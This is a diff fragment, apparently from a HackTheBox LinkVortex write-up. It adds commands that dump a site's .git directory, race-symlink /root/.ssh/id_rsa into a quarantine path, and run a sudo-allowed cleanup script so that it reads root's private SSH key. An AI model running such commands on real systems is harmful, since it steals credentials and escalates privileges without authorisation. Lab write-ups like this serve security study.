@@ -25,11 +25,11 @@ git-dumper http://dev.linkvortex.htb/.git gitdump
 ```
 
 ```
-
+while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png;done
 ```
 
 ```
-
+export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png
 ```
 
 ```
